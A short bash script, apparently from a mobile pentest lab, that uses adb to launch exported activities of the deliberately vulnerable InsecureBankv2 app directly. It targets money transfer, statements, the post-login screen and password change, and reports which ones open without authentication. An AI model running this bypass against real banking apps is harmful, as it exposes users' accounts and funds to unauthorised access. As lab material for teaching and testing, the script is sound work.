#!/usr/bin/env bash
echo "=== COMPONENT HIJACKING EXPLOIT DEMONSTRATION ==="
echo "[*] Testing if exported components can be accessed without authentication..."
echo ""

components=(
    "DoTransfer:Money Transfer Screen"
    "ViewStatement:Account Statements" 
    "PostLogin:Main Banking Interface"
    "ChangePassword:Password Change"
)

for component in "${components[@]}"; do
    name="${component%:*}"
    desc="${component#*:}"
    echo "Testing: $desc ($name)..."
    result=$(adb shell am start -n "com.android.insecurebankv2/.$name" 2>&1)
    
    if echo "$result" | grep -q "Starting: Intent"; then
        echo "✅ VULNERABLE: $desc opened WITHOUT authentication"
    else
        echo "❌ Blocked or error: $result"
    fi
    sleep 1
done

echo ""
echo "=== EXPLOIT SUMMARY ==="
echo "If any banking screens opened without login, this proves:"
echo "1. COMPONENT HIJACKING vulnerability exists"
echo "2. Attackers can bypass authentication" 
echo "3. Sensitive banking functions are exposed"
